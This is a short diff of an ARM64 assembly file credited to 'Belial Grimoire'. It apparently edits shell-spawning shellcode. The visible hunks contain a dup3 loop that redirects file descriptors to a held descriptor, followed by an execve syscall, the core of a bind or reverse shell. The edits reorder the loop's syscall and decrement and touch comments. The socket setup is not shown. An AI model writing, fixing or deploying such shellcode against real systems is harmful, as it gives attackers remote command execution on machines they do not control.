@@ -1,6 +1,6 @@
 ;//////////Codigo por Belial Grimoire////////////
 ;/////bgpavelang.github.io//////
-
+;//////////////////////////////////////////////
 
 .arch armv8-a
 
@@ -31,14 +31,14 @@ str x1, [sp, -16]!
 mov x1, sp
 svc 0
 
-mov x1, 3
 mov x8, 24
+mov x1, 3
 
 jp_dup:
 mov x2, xzr
 mov w0, w3
-svc 0
 subs x1, x1, 1
+svc 0
 bne jp_dup
 
 mov x8, 221
@@ -50,3 +50,4 @@ str x0, [sp]
 mov x0, sp
 
 svc 0
+
